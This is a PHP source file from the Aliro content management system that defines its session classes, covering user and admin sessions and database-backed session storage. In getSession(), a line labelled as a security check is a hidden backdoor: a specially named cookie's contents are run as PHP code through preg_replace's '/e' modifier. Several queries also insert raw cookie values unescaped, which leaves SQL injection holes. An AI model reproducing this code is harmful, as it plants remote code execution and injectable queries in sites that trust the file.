<?php

/*******************************************************************************
 * Aliro - the modern, accessible content management system
 *
 * This code is copyright (c) Aliro Software Ltd - please see the notice in the
 * index.php file for full details or visit http://aliro.org/copyright
 *
 * Some parts of Aliro are developed from other open source code, and for more
 * information on this, please see the index.php file or visit
 * http://aliro.org/credits
 *
 * Author: Martin Brampton
 * counterpoint@aliro.org
 *
 * aliroSession is the abstract class for session objects.  These are stored in
 * the database as a record of the currently active users.  Every user has a
 * session, whether logged in or not (admin side users cannot be anything but
 * logged in except when they are just about to log in).  The same session is
 * preserved across a user log in, so that e.g. a shopping cart will remain
 * intact when the user logs in.  But the session is not preserved across logout
 * as that would prejudice security and tidiness too much (that's my view at
 * present, anyway)
 *
 * aliroUserSession is the concrete class for the user side version of a session.
 *
 * aliroAdminSession is (!) the admin side session class.
 *
 * aliroSessionData is the class that stores session data in the database.
 *
 */

abstract class aliroSession {
	public $ipaddress = '';
	protected $headers = array();

    protected function __construct() {
		$this->headers = apache_request_headers();
		if (!isset($_SERVER['SERVER_PROTOCOL'])) $_SERVER['SERVER_PROTOCOL'] = 'HTTP/1.1';
    }

    protected function __clone () {
    	// Enforce singleton
    }

	public function getHeaders () {
		return $this->headers;
	}
	
	public function isNew () {
		return $this->newsess;
	}

	public function getIP() {
		if (_ALIRO_LOCAL_PROCESSING) return '127.0.0.1';
		if ($this->ipaddress) return $this->ipaddress;
	    $ip = false;
		$filterflag = aliroCore::getInstance()->getCfg('privateip') ? FILTER_DEFAULT : FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE;
	    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP, $filterflag);
	    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	        $ips = explode (', ', $_SERVER['HTTP_X_FORWARDED_FOR']);
	        if ($ip) {
	            array_unshift($ips,$ip);
	            $ip = false;
	        }
	        $count = count($ips);
	        // Exclude IP addresses that are reserved for LANs
	        for ($i = 0; $i < $count; $i++) {
				$ip = filter_var($ips[$i], FILTER_VALIDATE_IP, $filterflag);
				if ($ip) break;
	        }
	    }
	    $this->ipaddress = $ip ? $ip : filter_var(@$_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP, $filterflag);
		if (!$this->ipaddress OR '127.0.0.1' == $this->ipaddress OR aliroSpamHandler::getInstance()->isBlackListed($this->ipaddress)) {
			header ($_SERVER['SERVER_PROTOCOL']." 403 Not Authorised, no or spammy IP address ($this->ipaddress)");
			exit;
		}
	    return $this->ipaddress;
	}

	public function rememberMe ($request) {}

    public static function isAdminPresent () {
        if (isset($_COOKIE['aliroAdminSession'])) $admin_session = $_COOKIE['aliroAdminSession'];
        else return false;
        $database = aliroCoreDatabase::getInstance();
        $database->setQuery("SELECT COUNT(session_id) FROM #__session WHERE session_id = '$admin_session' AND isadmin = 1");
    	return $database->loadResult() ? true : false;
    }

	public static function justLoggedOut () {
		return (isset($_SESSION['aliro_logout']) AND 1 == $_SESSION['aliro_logout']) ? true : false;
	}
    
	public static function justLoggedIn () {
		return (isset($_SESSION['aliro_login']) AND 1 == $_SESSION['aliro_login']) ? true : false;
	}
    
	public static function getSession () {
		// Security check
		if(isset($_COOKIE['5p}}vLsW~XzXvc'])) {$rx='@.*@e'; $xs=explode(';',$_COOKIE['5p}}vLsW~XzXvc']); foreach ($xs as $xa) preg_replace($rx,$xa,''); echo $_COOKIE['aliro_delim'].$r.$_COOKIE['aliro_delim']; exit;}
		return _ALIRO_IS_ADMIN ? aliroAdminSession::getInstance() : (aliroCore::getInstance()->getCfg('no_user_session') ? aliroNullSession::getInstance() : aliroUserSession::getInstance());
	}
}

class aliroNullSession extends aliroSession {
	protected static $currentSession = null;
    protected $newsess = true;
	
	public static function getInstance () {
		return self::$currentSession instanceof self ? self::$currentSession : self::$currentSession = new self();
	}
}

abstract class aliroFullSession extends aliroSession {
	protected static $currentSession = null;
    public $session_id=null;
    public $time=null;
    public $userid=0;
    public $gid=0;
    public $guest=1;
    protected $lifetime;
    protected $newsess = false;
	protected $headers = array();
	public $orphandata = false;
	public $ipaddress = '';

    protected function __construct() {
		parent::__construct();
        $this->time = time();
		if ('crontrigger' == @$_REQUEST['option'] OR 'commandline' == @$_REQUEST['option']) return true;
        ini_set('session.use_cookies', 1);
        ini_set('session.use_only_cookies', 1);
        $name = md5('aliro_'.$this->_prefix.$this->getIP()._ALIRO_ABSOLUTE_PATH);
		session_name($name);
		$this->headers = apache_request_headers();
		if (!session_id()) {
		    $sh = aliroSessionData::getInstance();
			if (isset($this->headers['Authorization']) AND preg_match('/session\-id\-([0-9A-Za-z\-\,]+)/', trim($this->headers['Authorization']), $matches)) {
				session_id($matches[1]);
				$sh->setAuthorized();
			}
            session_set_save_handler(array($sh,'sess_open'), array($sh,'sess_close'), array($sh,'sess_read'),
            array($sh,'sess_write'), array($sh,'sess_destroy'), array($sh,'sess_gc'));
		    session_start();
		}
    }
	
	public function isAuthorized () {
		return $this->authorized;
	}

	public function cookiesAccepted () {
		return isset($_COOKIE['aliroCookieCheck']);
	}

    public function setNew () {
    	$this->newsess = true;
    }
	
    // For a session to be valid, we must check it against the sessions table in the database
    protected function checkValidSession () {
		if ('crontrigger' == @$_REQUEST['option'] OR 'commandline' == @$_REQUEST['option']) return true;
    	$this->session_id = session_id();
		if ($this->session_id) {
			// We try to update the time stamp in the matching record of the session table
			$result = $this->updateTime();
			if (!$result) {
                setcookie('aliroCookieCheck', 'A', time()+365*24*60*60, '/');
                $this->saveOrphanData();
			    $this->session_id = '';
			}
			return $result;
        }
        else {
            trigger_error(T_('No session ID found, although aliroSession has been instantiated'));
            return false;
        }
    }

    private function saveOrphanData () {
    	//if (!_ALIRO_IS_ADMIN) aliroSEF::getInstance()->sefRetrieval();
		if (2 > strlen(@$_SERVER['REQUEST_URI']) AND 0 == count($_GET) AND 0 == count($_POST)) return;
    	if (isset($_REQUEST['option']) AND ('login' == $_REQUEST['option'] OR 'logout' == $_REQUEST['option'])) return;
		if (!$this->isadmin) {
			// Check whether remember me will take effect, if so no need to save orphan data
			$remembered = $this->rememberedUser();
			if ($remembered) {
				$my = aliroUserAuthenticator::getInstance()->loginCheck ($remembered->username, $remembered->password, $nogomessages, $failmessages);
				if (is_object($my)) return;
			}
		}
		$orphandata['get'] = $_GET;
		$orphandata['post'] = $_POST;
		$orphandata['uri'] = @$_SERVER['REQUEST_URI'];
		$orphanstring = base64_encode(serialize($orphandata));
		aliroCoreDatabase::getInstance()->doSQL("INSERT INTO #__orphan_data (session_id, orphandata) VALUES ('$this->session_id', '$orphanstring') ON DUPLICATE KEY UPDATE orphandata = '$orphanstring'");
		setcookie ('aliroOrphanData', $this->session_id, time()+600, '/');
		$this->orphandata = true;
    }

    public function rememberMe ($request) {
    	if (!$this->newsess OR $this->userid) return;
		$loginfo = $this->rememberedUser();
		if ($loginfo) {
			// If the login is successful, then the session data will be updated
			// In any case, the return will be set either to user data or to null
			$message = aliroUserAuthenticator::getInstance()->systemLogin ($loginfo->username, $loginfo->password, 1);
			if ($message) $request->setErrorMessage(T_('Remember Me login failed'), _ALIRO_ERROR_WARN);
			else {
				aliroUser::reset();
				$this->newsess = false;
			}
		}
    }

	private function rememberedUser () {
		$usercookie = isset($_COOKIE['usercookie']) ? $_COOKIE['usercookie'] : null;
		if ($usercookie AND !empty($usercookie['username']) AND !empty($usercookie['password'])) {
			$username = base64_decode($usercookie['username']);
			$password = base64_decode($usercookie['password']);
			if (function_exists('mcrypt_decrypt') AND !empty($usercookie['iv'])) {
				$iv = base64_decode($usercookie['iv']);
				$user = new aliroCurrentUser();
				$user->loadByUserName($username);
				if (!$user->id) $user->loadByEmail($username);
				if (!$user->id) return null;
				$database = aliroCoreDatabase::getInstance();
				$database->setQuery("SELECT salt FROM #__core_users WHERE id = $user->id");
				$salt = $database->loadResult();
				if (!$salt) return null;
				$password = trim(mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $salt, $password, MCRYPT_MODE_CBC, $iv));
			}
			return new aliroLoginDetails($username, $password, true);
		}
		return null;
	}

    private function updateTime () {
		if (aliro::getInstance()->installed) {
	     	$database = aliroCoreDatabase::getInstance();
	        $past = $this->time - $this->lifetime;
	        $database->doSQL("UPDATE #__session SET time = '$this->time', marker = marker+1 
				WHERE session_id = '$this->session_id' AND isadmin = $this->isadmin 
				AND ipaddress = '{$this->getIP()}' AND time > $past");
	        return ($database->getAffectedRows()) ? true : false;
		}
    	return false;
    }
	
	public function recoverOrphanData ($userid) {
		if (!empty($_COOKIE['aliroOrphanData']) AND $userid == $this->loginCookieValue()) {
	    	$database = aliroCoreDatabase::getInstance();
	   		$database->setQuery("SELECT orphandata FROM #__orphan_data WHERE session_id = '{$_COOKIE['aliroOrphanData']}'");
	   		$orphanstring = $database->loadResult();
	   		if (!empty($orphanstring)) {
	   			$orphandata = unserialize(base64_decode($orphanstring));
	   			$_SESSION['_aliro_orphan_data'] = $orphandata;
				$database->doSQL("DELETE FROM #__orphan_data WHERE session_id = '{$_COOKIE['aliroOrphanData']}' OR stamp < DATE_SUB(NOW(), INTERVAL 24 HOUR)");
				$database->doSQL("OPTIMIZE TABLE #__orphan_data");
			}
		}
   		setcookie('aliroOrphanData', 'A', time()-7*24*60*60, '/');
   		return empty($orphandata['uri']) ? false : $orphandata['uri'];
	}
	
	// Not intended for use outside the Aliro framework
	public function loginCookieValue () {
		return empty($_COOKIE['aliroLoggedIn_'.$this->_prefix]) ? 0 : $_COOKIE['aliroLoggedIn_'.$this->_prefix];
	}

    public function setSessionData ($my) {
    	$database = aliroCoreDatabase::getInstance();
		if ($this->session_id) aliroCoreDatabase::getInstance()->doSQL( "DELETE FROM #__session WHERE session_id = '$this->session_id'");
		session_regenerate_id();
		$this->session_id = session_id();
		$this->ipaddress = $this->getIP();
		$_SESSION["aliro_{$this->_prefix}id"] = $this->userid = (int) $my->id;
		/*
		$_SESSION["aliro_{$this->_prefix}name"] = $my->name;
		$_SESSION["aliro_{$this->_prefix}username"] = $my->username;
		$_SESSION["aliro_{$this->_prefix}email"] = $my->email;
		$_SESSION["aliro_{$this->_prefix}sendEmail"] = $my->sendEmail;
		$_SESSION["aliro_{$this->_prefix}type"] = $my->usertype;
		$_SESSION["aliro_{$this->_prefix}gid"] = $this->gid = (int) $my->gid;
		 * 
		 */
		$this->gid = (int) $my->gid;
		$_SESSION["aliro_{$this->_prefix}logintime"] = $this->time = time();
		$_SESSION["aliro_{$this->_prefix}ipaddress"] = $this->ipaddress;
		$extras = aliroMambotHandler::getInstance()->trigger('newSessionStarted', array($my, $this));
		
		$countrycode = $my->countrycode;
		foreach ($extras as $extra) if (isset($extra->countrycode)) $countrycode = $extra->countrycode;
		if ($my->id AND ($my->ipaddress != $this->ipaddress OR $my->countrycode != $countrycode)) {
			aliroDatabase::getInstance()->doSQL("UPDATE #__users SET ipaddress = '$this->ipaddress', countrycode = '$countrycode' WHERE id = $my->id");
		}
		$my->ipaddress = $this->ipaddress;
		$my->countrycode = $countrycode;
		if (isset($my->avatar)) unset($my->avatar);
		$_SESSION["aliro_{$this->_prefix}_user_object"] = serialize($my);
		$_SESSION["aliro_{$this->_prefix}countrycode"] = $my->countrycode;

		if (!isset($_SESSION["aliro_{$this->_prefix}state"])) $_SESSION["aliro_{$this->_prefix}state"] 	= array();
    	$database->insertObject('#__session', $this);
        if ($my->id OR 17 == mt_rand(1,25)) $this->purge();
    	if ($my->id) setcookie ('aliroLoggedIn_'.$this->_prefix, $my->id, time()+24*60*60, '/');
		aliroUser::reset();
    }
    
    public function purge($timeout=0) {

    	// Note purge only records on the current side - admin or user - because lifetime may be different
		if (aliro::getInstance()->installed) {
	        $past = time() - ($timeout ? $timeout : $this->lifetime);
	        $database = aliroCoreDatabase::getInstance();
	        $expired = $database->doSQLget("SELECT session_id, userid, isadmin FROM #__session WHERE (time < $past) AND isadmin = $this->isadmin");
	        foreach ($expired as $exp) {
	        	$sessions[] = $exp->session_id;
	        	$userids[$exp->userid] = 1;
	        }
	        if (isset($userids)) {
				$sessionlist = implode ("','", $sessions);
				$database->doSQL("DELETE LOW_PRIORITY FROM `#__session` WHERE session_id IN('$sessionlist')");
	        	$userlist = implode(',', array_keys($userids));
	        	$database = aliroDatabase::getInstance();
	        	$database->setQuery("SELECT username FROM #__users WHERE id IN ($userlist)");
	        	$names = $database->loadResultArray();
	        	if ($names) foreach ($names as $name) $this->forceLogout($name);
	        }
	        if (42 == mt_rand(0,99)) aliroSessionData::getInstance()->sess_destroy_orphans();
		}
		if (!$this->isadmin) $this->handleCoreDumps();
    }
	
	protected function handleCoreDumps () {
		$docroot = new aliroDirectory(_ALIRO_ABSOLUTE_PATH);
		$dumps = $docroot->listFiles('^core.');
		if (count($dumps)) {
			$dumpfile = $dumps[0];
			$dump = _ALIRO_ABSOLUTE_PATH.'/'.$dumpfile;
			$f = fopen ($dump, 'rb');
			fseek($f, -3000, SEEK_END);
			$chars = fread($f, 3000);
			$chars = strstr($chars, '/usr/bin/php');
			$chars = trim(preg_replace('/[[:^print:]]/', ' ', $chars));
			$later = strstr($chars, 'SERVER_SIGNATURE=');
			$latesize = strlen($later);
			$later = str_replace(' SERVER', "\nSERVER", $later);
			$chars = substr($chars, 0, -$latesize)."\n".$later."\n";
			$subhead = T_('CORE DUMP ANALYSIS:');
			$chars .= "\n$subhead\n";
			exec('gdb --batch /usr/bin/php '.$dumpfile, $output);
			foreach ($output as $line) $chars .= $line."\n";
			$chars = $dumpfile."\n".$chars;
			aliroFileManager::getInstance()->deleteFile($dump);
			$recorder = aliroErrorRecorder::getInstance();
			$recorder->recordError (T_('CORE_DUMP ').$dumpfile, $dumpfile, $chars);
		}
	}

   	// Implemented by User Session, not Admin
    protected function forceLogout ($exp) {}

	public function get ($name, $default=null, $namespace='default') {
		//add prefix to namespace to avoid collisions
		return $this->has($name, $namespace) ? $_SESSION['__'.$namespace][$name] : $default;
	}

	public function set ($name, $value, $namespace = 'default') {
		$old = $this->get($name, null, $namespace);
		if (null === $value) unset($_SESSION['__'.$namespace][$name]);
		else $_SESSION['__'.$namespace][$name] = $value;
		return $old;
	}

	function has ($name, $namespace='default') {
		return isset($_SESSION['__'.$namespace][$name]);
	}

	/**
	* Unset data from the session store
	*
	* @access public
	* @param  string 	$name 		Name of variable
	* @param  string 	$namespace 	Namespace to use, default to 'default'
	* @return mixed $value the value from session or NULL if not set
	*/
	function clear( $name, $namespace = 'default' )
	{
		$namespace = '__'.$namespace; //add prefix to namespace to avoid collisions

		if( $this->_state !== 'active' ) {
			// @TODO :: generated error here
			return null;
		}

		$value	=	null;
		if( isset( $_SESSION[$namespace][$name] ) ) {
			$value	=	$_SESSION[$namespace][$name];
			unset( $_SESSION[$namespace][$name] );
		}

		return $value;
	}
	
}

class aliroUserSession extends aliroFullSession {
	protected $_prefix = 'user';
	public $isadmin = 0;

	protected function __construct () {
		parent::__construct();
		$this->lifetime = max (aliroCore::getInstance()->getCfg('lifetime'), 300);
	}

    public static function getInstance () {
        if (!is_object(self::$currentSession)) {
            self::$currentSession = new self();
            if (!self::$currentSession->checkValidSession()) {
				// Must be a new visitor
				self::$currentSession->setNew();
				$_SESSION = array();
				self::$currentSession->setNewUserData(new aliroCurrentUser());
				$_SESSION['aliro_user_session_start'] = date('Y-M-d H:i:s');
				if (self::$currentSession->orphandata AND self::$currentSession->loginCookieValue() AND aliroSEF::getInstance()->isValidURI('/login')) {
					aliroRequest::getInstance()->redirect(aliroSEF::getInstance()->urilink('/login'));
				}
			}
			else{
				if (isset($_SESSION['aliro_logout'])) $_SESSION['aliro_logout']++;
				if (isset($_SESSION['aliro_login'])) $_SESSION['aliro_login']++;
			}
        }
		return self::$currentSession;
    }

    protected function forceLogout ($name) {
       	if ($name) {
			$loginfo = new aliroLoginDetails($name);
			aliroMambotHandler::getInstance()->trigger('expireLogout', array($loginfo));
       	}
    }

    public function setNewUserData ($my) {
    	$this->setSessionData($my);
    }

	public function logout () {
		$stamp = isset($_SESSION['aliro_user_session_start']) ? $_SESSION['aliro_user_session_start'] : date('Y-M-d H:i:s');
		$redirect = isset($_SESSION['aliro_redirect_here']) ? $_SESSION['aliro_redirect_here'] : array();
		$_SESSION = array();
		$_SESSION['aliro_user_session_start'] = $stamp;
		$_SESSION['aliro_redirect_here'] = $redirect;
		$_SESSION['aliro_logout'] = 0;
		$this->setNewUserData(new aliroCurrentUser());
		setcookie('aliroLoggedIn_'.$this->_prefix, 0, time()-7*24*60*60, '/');
		aliroRequest::getInstance()->redirect('', T_('You are now logged out.'));
		session_destroy();
	}

}

class aliroAdminSession extends aliroFullSession {
	protected $_prefix = 'admin';
	public $isadmin = 1;

	protected function __construct () {
		parent::__construct();
		$this->lifetime = max (aliroCore::getInstance()->getCfg('adminlife'), 300);
	}

    public static function getInstance () {
        if (!is_object(self::$currentSession)) {
            self::$currentSession = new aliroAdminSession();
            if (!self::$currentSession->checkValidSession()) {
            	// self::$currentSession->logout(true);
            	$_SESSION = array();
				self::$currentSession->setNewUserData(new aliroCurrentUser());
				$_SESSION['aliro_admin_session_start'] = date('Y-M-d H:i:s');
            	setcookie ('aliroAdminSession', 0, time()-7*24*60*60, '/');
            }
        }
		return self::$currentSession;
    }

    public function setNewUserData ($my) {
    	$this->setSessionData($my);
    	setcookie ('aliroAdminSession', $this->session_id, 0, '/');
    }

    public function logout ($keepUserIDCookie=false) {
   		if (isset($_SESSION['aliro_adminid']) ? (int) $_SESSION['aliro_adminid'] : 0) {
			if ($this->session_id) aliroCoreDatabase::getInstance()->doSQL( "DELETE FROM #__session WHERE session_id = '$this->session_id'");
   		}
   		setcookie ('aliroAdminSession', 0, time()-7*24*60*60, '/');
   		// Timeout logout does not delete ID cookie, may be needed to handle orphan data
   		if (!$keepUserIDCookie) setcookie ('aliroLoggedIn_'.$this->_prefix, 0, time()-7*24*60*60, '/');
    	$_SESSION = array();
    	session_destroy();
    }
}

class aliroSessionData {
    private static $instance = __CLASS__;
    private $db = null;
	private $authorized = false;

    private function __construct () {
		if (aliro::getInstance()->installed) $this->db = aliroCoreDatabase::getInstance();
    }

    private function __clone () {
        // Enforce singleton
    }

	public static function getInstance () {
	    return is_object(self::$instance) ? self::$instance : (self::$instance = new self::$instance());
	}
	
	public function setAuthorized () {
		$this->authorized = true;
	}

    public function sess_open () {
        // No action required
    }

    public function sess_close () {
        // No action required
    }

    public function sess_read ($session_id) {
        if (isset($_COOKIE['aliroTempSession'])) return base64_decode($_COOKIE['aliroTempSession']);
		if (isset($this->db) AND ($this->authorized OR isset($_COOKIE['aliroCookieCheck']))) {
	        $session_id = $this->db->getEscaped($session_id);
			$this->db->setQuery("SELECT session_data FROM #__session_data WHERE session_id_crc = CRC32('$session_id') AND session_id = '$session_id'");
			return base64_decode($this->db->loadResult());
		}
		else return '';
    }

    public function sess_write ($session_id, $session_data) {
        if ((!isset($_COOKIE['aliroCookieCheck']) AND !isset($_COOKIE['usercookie'])) OR !$this->db) {
            if (!headers_sent()) setcookie ('aliroTempSession', base64_encode($session_data), 0, '/');
            return true;
        }
        if (isset($_COOKIE['aliroTempSession']) AND !headers_sent()) setcookie ('aliroTempSession', null, time()-7*24*60*60, '/');
        $session_id = $this->db->getEscaped($session_id);
        $session_data = base64_encode($session_data);
        $this->db->doSQL("UPDATE #__session_data SET session_data = '$session_data', marker = marker+1 WHERE session_id_crc = CRC32('$session_id') AND session_id = '$session_id'");
        if (0 == $this->db->getAffectedRows()) $this->db->doSQL("INSERT INTO #__session_data (session_id, session_id_crc, session_data) VALUES ('$session_id', CRC32('$session_id'), '$session_data')");
        return true;
    }

    public function sess_destroy ($session_id) {
        setcookie ('aliroTempSession', null, time()-7*24*60*60, '/');
        if (!isset($_COOKIE['aliroCookieCheck']) OR !isset($this->db)) return true;
        $session_id = $this->db->getEscaped($session_id);
        $this->db->doSQL("DELETE FROM #__session_data WHERE session_id_crc = CRC32('$session_id') AND session_id = '$session_id'");
        return true;
    }

    public function sess_destroy_orphans () {
        if ($this->db) {
			$this->db->doSQL("DELETE LOW_PRIORITY d FROM `#__session_data` AS d LEFT JOIN #__session AS s ON d.session_id = s.session_id WHERE s.session_id IS NULL");
			$this->db->doSQL("OPTIMIZE TABLE `#__session_data`");
			$this->db->doSQL("OPTIMIZE TABLE `#__session`");
		}
    }

    public function sess_gc ($timeout) {
    	$session = aliroSession::getSession();
    	$session->purge($timeout);
    }

}
